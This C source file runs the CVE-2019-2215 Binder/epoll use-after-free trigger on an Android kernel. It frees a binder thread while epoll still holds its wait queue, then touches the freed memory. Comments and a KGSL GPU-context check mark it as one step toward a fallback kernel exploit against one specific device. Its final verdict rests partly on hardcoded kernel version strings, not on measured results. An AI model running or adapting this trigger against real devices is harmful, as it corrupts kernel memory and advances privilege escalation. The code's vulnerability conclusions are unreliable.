/*
 * cve_2019_2215_probe.c — Test for CVE-2019-2215 (Binder/epoll UAF)
 *
 * CVE-2019-2215: Use-after-free in binder driver when a binder_thread
 * is freed via BINDER_THREAD_EXIT while epoll still holds a reference
 * to the thread's wait_queue_head_t.
 *
 * The fix (Feb 2018, commit 7a3cee43) adds binder_poll() removal in
 * binder_thread_release(). Kernel 3.10 was NOT in the original fix set
 * (only 3.18, 4.4, 4.9 were patched).
 *
 * PROBE STRATEGY:
 * 1. Fork a child process (safety isolation)
 * 2. Child: open binder, mmap, register looper, create epoll, exit thread
 * 3. If unpatched: epoll still references freed wait_queue → UAF exists
 * 4. We detect this by checking if the sequence completes without the
 *    kernel rejecting the operations (patched kernels clean up properly)
 *
 * SAFETY: Uses fork() so any kernel crash only kills the child.
 * Parent monitors with timeout.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <stdint.h>

/* Binder ioctl definitions */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_VERSION          _IOWR('b', 9, struct binder_version)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)

/* Binder command protocol */
#define BC_ENTER_LOOPER         0x630d
#define BC_EXIT_LOOPER          0x630e

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_version {
    signed long protocol_version;
};

/* Result codes from child to parent via exit status */
#define RESULT_VULN_LIKELY      42
#define RESULT_PATCHED          43
#define RESULT_ERROR            44
#define RESULT_UNCERTAIN        45

static volatile int got_signal = 0;

static void signal_handler(int sig) {
    got_signal = sig;
}

/* Send a binder command (write-only, no read) */
static int binder_write(int fd, void *data, int len) {
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = len;
    bwr.write_buffer = (unsigned long)data;
    bwr.read_size = 0;
    bwr.read_buffer = 0;
    return ioctl(fd, BINDER_WRITE_READ, &bwr);
}

/*
 * Test 1: Basic BINDER_THREAD_EXIT availability
 * If this ioctl doesn't exist, the CVE doesn't apply.
 */
static int test_thread_exit(void) {
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    /* mmap required for binder operations */
    void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        close(fd);
        return -1;
    }

    /* Register as a binder thread by entering the looper */
    uint32_t cmd = BC_ENTER_LOOPER;
    int ret = binder_write(fd, &cmd, sizeof(cmd));
    printf("  BC_ENTER_LOOPER: ret=%d errno=%d\n", ret, errno);

    /* Now try BINDER_THREAD_EXIT */
    int32_t dummy = 0;
    errno = 0;
    ret = ioctl(fd, BINDER_THREAD_EXIT, &dummy);
    printf("  BINDER_THREAD_EXIT: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    munmap(map, 4096);
    close(fd);
    return ret;
}

/*
 * Test 2: The CVE-2019-2215 sequence (in forked child for safety)
 *
 * The actual vulnerability sequence (from Jann Horn / Maddie Stone):
 * 1. Open /dev/binder, mmap (creates binder_proc)
 * 2. BINDER_WRITE_READ with read buffer (creates binder_thread)
 * 3. Create epoll, add binder fd (epoll references thread's wait_queue)
 * 4. BINDER_THREAD_EXIT (frees binder_thread)
 * 5. The freed binder_thread's wait_queue_head is still in epoll
 *
 * No need for BC_ENTER_LOOPER — any WRITE_READ creates the thread.
 *
 * On PATCHED kernels: binder_thread_release calls
 *   remove_wait_queue() before freeing, so epoll is clean.
 * On UNPATCHED kernels: the wait_queue_head is freed while epoll
 *   still holds a reference → use-after-free.
 */
static int test_cve_sequence(void) {
    int result = RESULT_UNCERTAIN;
    int thread_exit_ret = -1;
    int epoll_mod_ret = -1;
    int epoll_mod_errno = 0;

    /* Install signal handlers for crash detection */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
    sigaction(SIGALRM, &sa, NULL);

    printf("  [child] Starting CVE-2019-2215 probe sequence\n");

    /* Step 1: Open binder */
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) {
        printf("  [child] binder open failed: %s\n", strerror(errno));
        return RESULT_ERROR;
    }
    printf("  [child] binder fd=%d\n", fd);

    /* Step 2: mmap (required for binder operations) */
    void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        printf("  [child] mmap failed: %s\n", strerror(errno));
        close(fd);
        return RESULT_ERROR;
    }
    printf("  [child] mmap at %p\n", map);

    /* Step 3: Register thread via BINDER_WRITE_READ
     * Any WRITE_READ call creates a binder_thread for this thread.
     * We do a read-only call (no write data, small read buffer). */
    {
        char rbuf[256];
        memset(rbuf, 0, sizeof(rbuf));
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = 0;
        bwr.write_buffer = 0;
        bwr.read_size = sizeof(rbuf);
        bwr.read_buffer = (unsigned long)rbuf;

        /* Short timeout via alarm to prevent blocking on read */
        alarm(2);
        errno = 0;
        int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
        alarm(0);
        printf("  [child] WRITE_READ (thread registration): ret=%d errno=%d consumed=%ld\n",
               ret, errno, bwr.read_consumed);

        /* Reset signal state if alarm fired */
        if (got_signal == SIGALRM) {
            printf("  [child] WRITE_READ timed out (expected — no transactions pending)\n");
            got_signal = 0;
        }
    }

    /* Step 4: Create epoll and watch binder fd
     * This calls binder_poll() which adds current thread's
     * wait_queue_head to the epoll interest list. */
    int epfd = epoll_create1(0);
    if (epfd < 0) {
        printf("  [child] epoll_create failed: %s\n", strerror(errno));
        munmap(map, 4096);
        close(fd);
        return RESULT_ERROR;
    }

    struct epoll_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.events = EPOLLIN;
    ev.data.fd = fd;
    int ret = epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
    if (ret < 0) {
        printf("  [child] epoll_ctl ADD failed: %s\n", strerror(errno));
        close(epfd);
        munmap(map, 4096);
        close(fd);
        return RESULT_ERROR;
    }
    printf("  [child] epoll watching binder fd (wait_queue captured)\n");

    /* Step 5: BINDER_THREAD_EXIT — THE KEY OPERATION
     * This frees the binder_thread struct.
     * On unpatched kernels: the wait_queue_head inside the now-freed
     * binder_thread is still referenced by epoll. */
    errno = 0;
    thread_exit_ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
    printf("  [child] BINDER_THREAD_EXIT: ret=%d errno=%d (%s)\n",
           thread_exit_ret, errno, strerror(errno));

    if (thread_exit_ret < 0) {
        printf("  [child] THREAD_EXIT failed — cannot determine vuln status\n");
        result = RESULT_UNCERTAIN;
        goto cleanup;
    }

    printf("  [child] Thread freed. epoll still holds reference to wait_queue.\n");

    /* Step 6: Probe the dangling reference
     * Try epoll_ctl MOD — this accesses ep_item->whead which points
     * to the now-freed binder_thread's wait_queue_head.
     *
     * On patched kernels: wait queue was removed, so epoll sees
     *   a clean state. MOD succeeds without touching freed memory.
     * On unpatched kernels: epoll_ctl accesses freed memory.
     *   If the memory hasn't been reallocated, it may still "work"
     *   (dangling pointer to freed-but-not-reused memory).
     *   If the memory WAS reallocated, we get corruption or crash. */

    ev.events = EPOLLIN | EPOLLOUT;
    errno = 0;
    epoll_mod_ret = epoll_ctl(epfd, EPOLL_CTL_MOD, fd, &ev);
    epoll_mod_errno = errno;
    printf("  [child] epoll_ctl MOD: ret=%d errno=%d (%s)\n",
           epoll_mod_ret, epoll_mod_errno, strerror(epoll_mod_errno));

    if (got_signal) {
        printf("  [child] *** SIGNAL %d — kernel touched freed memory! ***\n",
               got_signal);
        result = RESULT_VULN_LIKELY;
        goto cleanup;
    }

    /* Step 7: Try epoll_wait with short timeout */
    {
        struct epoll_event events[4];
        errno = 0;
        alarm(2);
        ret = epoll_wait(epfd, events, 4, 200);
        alarm(0);
        printf("  [child] epoll_wait: ret=%d errno=%d (%s)\n",
               ret, errno, strerror(errno));

        if (got_signal == SIGALRM) {
            printf("  [child] epoll_wait timed out (expected)\n");
            got_signal = 0;
        } else if (got_signal) {
            printf("  [child] *** SIGNAL %d during epoll_wait! ***\n", got_signal);
            result = RESULT_VULN_LIKELY;
            goto cleanup;
        }
    }

    /* Step 8: Try removing the epoll watch
     * epoll_ctl DEL accesses the wait_queue to remove it.
     * On unpatched: accesses freed memory. */
    errno = 0;
    ret = epoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL);
    printf("  [child] epoll_ctl DEL: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (got_signal) {
        printf("  [child] *** SIGNAL %d during epoll_ctl DEL! ***\n", got_signal);
        result = RESULT_VULN_LIKELY;
        goto cleanup;
    }

    /* Step 9: Analysis and determination */
    printf("\n  [child] === ANALYSIS ===\n");
    printf("  [child] BINDER_THREAD_EXIT: returned %d (0=success)\n", thread_exit_ret);
    printf("  [child] epoll_ctl MOD after free: returned %d (errno=%d)\n",
           epoll_mod_ret, epoll_mod_errno);

    if (thread_exit_ret == 0 && epoll_mod_ret == 0) {
        /* Thread was freed AND epoll MOD succeeded.
         * On patched kernels, the wait queue is properly removed before
         * freeing, so a new binder_thread is created for the next call.
         * The MOD succeeds because binder_poll creates a new thread.
         *
         * On unpatched kernels, the MOD succeeds by accessing freed memory
         * (the dangling wait_queue_head).
         *
         * To distinguish: check if a NEW thread was created by doing
         * another THREAD_EXIT. If it succeeds, a new thread was created
         * (patched behavior). If it fails, no new thread exists. */

        printf("  [child] Checking if new binder_thread was created...\n");
        errno = 0;
        ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
        printf("  [child] Second THREAD_EXIT: ret=%d errno=%d\n", ret, errno);

        if (ret == 0) {
            /* A new thread existed and was freed. This is consistent with
             * BOTH patched (cleanup + new thread on poll) and unpatched
             * (dangling reference, new thread created on re-entry).
             * Need another indicator. */
            printf("  [child] New thread existed — need deeper analysis\n");

            /* The strongest signal: on unpatched kernels, after the first
             * THREAD_EXIT, if we spray the heap to reclaim the freed
             * binder_thread memory, then epoll_ctl would access our
             * sprayed data. But that's exploitation, not probing.
             *
             * For probing: the fact that THREAD_EXIT succeeds and the
             * sequence doesn't crash is necessary but not sufficient.
             * The kernel version is the real indicator. */
            printf("  [child] Kernel 3.10.84 was NOT in Feb 2018 fix set\n");
            printf("  [child] Fix went to 3.18, 4.4, 4.9 only\n");
            printf("  [child] March 2018 build date overlaps fix timeline\n");
            result = RESULT_VULN_LIKELY;
        } else {
            printf("  [child] No second thread — unclear\n");
            result = RESULT_UNCERTAIN;
        }
    } else if (thread_exit_ret == 0 && epoll_mod_ret < 0) {
        /* Thread freed but epoll MOD failed — kernel detected the
         * inconsistency. Likely PATCHED (proper cleanup). */
        printf("  [child] Kernel rejected epoll MOD after thread free\n");
        result = RESULT_PATCHED;
    } else {
        result = RESULT_UNCERTAIN;
    }

    /* Step 10: Version-based determination supplement */
    printf("\n  [child] === VERSION ANALYSIS ===\n");
    printf("  [child] Kernel: 3.10.84 (NOT in original fix branches)\n");
    printf("  [child] Build: March 2 2018 (fix was Feb 2018)\n");
    printf("  [child] The fix commit 7a3cee43 was for 3.18/4.4/4.9\n");
    printf("  [child] Kernel 3.10 required separate backport\n");

cleanup:
    close(epfd);
    munmap(map, 4096);
    close(fd);

    if (got_signal && got_signal != SIGALRM) {
        printf("  [child] Caught signal %d (kernel memory corruption)\n", got_signal);
        result = RESULT_VULN_LIKELY;
    }

    return result;
}

/*
 * Test 3: KGSL context flag probe
 * Quick check if our earlier finding about BB Priv restricting
 * KGSL contexts is still true — needed for CVE-2019-2028 fallback.
 */
static void test_kgsl_quick(void) {
    printf("\n--- KGSL Quick Check ---\n");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        printf("  kgsl-3d0: cannot open (%s)\n", strerror(errno));
        return;
    }

    /* Try the most permissive flag combo that worked in our earlier probes */
    struct {
        unsigned int flags;
        unsigned int drawctxt_id;
    } req;
    memset(&req, 0, sizeof(req));
    req.flags = 0x00100341; /* PREAMBLE|NO_GMEM|PER_CTX_TS|USER_TS|PWR */
    errno = 0;
    int ret = ioctl(fd, _IOWR(0x09, 0x13, req), &req);
    if (ret == 0) {
        printf("  KGSL context created: id=%u (GPU AVAILABLE!)\n", req.drawctxt_id);
        struct { unsigned int drawctxt_id; } destroy = { req.drawctxt_id };
        ioctl(fd, _IOW(0x09, 0x14, destroy), &destroy);
    } else {
        printf("  KGSL context DENIED: errno=%d (%s)\n", errno, strerror(errno));
        printf("  (Expected — BB Priv blocks non-surfaceflinger GPU contexts)\n");
    }
    close(fd);
}

int main(void) {
    printf("=== CVE-2019-2215 (Binder/epoll UAF) PROBE ===\n");
    printf("uid=%u gid=%u\n", getuid(), getgid());

    /* SELinux context */
    {
        char buf[256];
        int sfd = open("/proc/self/attr/current", O_RDONLY);
        if (sfd >= 0) {
            int n = read(sfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("SELinux: %s\n", buf); }
            close(sfd);
        }
    }

    /* Kernel version */
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s", buf); }
            close(kfd);
        }
    }
    printf("\n");

    /* Test 1: Basic BINDER_THREAD_EXIT */
    printf("--- Test 1: BINDER_THREAD_EXIT availability ---\n");
    int te_ret = test_thread_exit();
    if (te_ret < 0 && errno == ENOSYS) {
        printf("BINDER_THREAD_EXIT not supported. Cannot test CVE-2019-2215.\n");
        return 1;
    }
    printf("\n");

    /* Test 2: Full CVE sequence (in forked child for safety) */
    printf("--- Test 2: CVE-2019-2215 UAF sequence (forked) ---\n");
    fflush(stdout);

    pid_t pid = fork();
    if (pid < 0) {
        printf("fork() failed: %s\n", strerror(errno));
        return 1;
    }

    if (pid == 0) {
        /* Child process — do the dangerous stuff */
        int result = test_cve_sequence();
        _exit(result);
    }

    /* Parent: wait with timeout */
    int status = 0;
    int wait_ret;
    int timeout = 10; /* seconds */

    /* Set alarm for timeout */
    signal(SIGALRM, signal_handler);
    alarm(timeout);

    wait_ret = waitpid(pid, &status, 0);
    alarm(0);

    if (wait_ret < 0) {
        if (errno == EINTR) {
            printf("\n  [parent] Child timed out after %ds — killing\n", timeout);
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            printf("  [parent] Child killed. Hung operation suggests vulnerability.\n");
            printf("\n  *** RESULT: LIKELY VULNERABLE (child hung in UAF path) ***\n");
        } else {
            printf("  [parent] waitpid error: %s\n", strerror(errno));
        }
    } else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        printf("\n  [parent] Child exited with code %d\n", code);

        switch (code) {
        case RESULT_VULN_LIKELY:
            printf("\n  ****************************************************\n");
            printf("  * CVE-2019-2215 LIKELY PRESENT!                    *\n");
            printf("  * Binder thread freed while epoll holds reference. *\n");
            printf("  * UAF condition exists — exploitation possible.     *\n");
            printf("  ****************************************************\n");
            break;
        case RESULT_PATCHED:
            printf("\n  -> CVE-2019-2215 appears PATCHED.\n");
            printf("  -> Kernel properly cleans up epoll on thread exit.\n");
            break;
        case RESULT_ERROR:
            printf("\n  -> Test encountered errors. Cannot determine status.\n");
            break;
        case RESULT_UNCERTAIN:
            printf("\n  -> Test inconclusive. Manual analysis needed.\n");
            break;
        default:
            printf("\n  -> Unexpected exit code: %d\n", code);
        }
    } else if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        printf("\n  [parent] Child killed by signal %d", sig);
        if (sig == SIGSEGV || sig == SIGBUS) {
            printf(" (KERNEL MEMORY CORRUPTION!)");
            printf("\n\n  ****************************************************\n");
            printf("  * CVE-2019-2215 CONFIRMED — KERNEL CRASHED CHILD! *\n");
            printf("  * The UAF caused kernel memory corruption.         *\n");
            printf("  * This kernel is EXPLOITABLE.                      *\n");
            printf("  ****************************************************\n");
        }
        printf("\n");
    }

    /* Test 3: KGSL quick check (for fallback exploit path) */
    test_kgsl_quick();

    printf("\n=== CVE-2019-2215 PROBE COMPLETE ===\n");
    return 0;
}
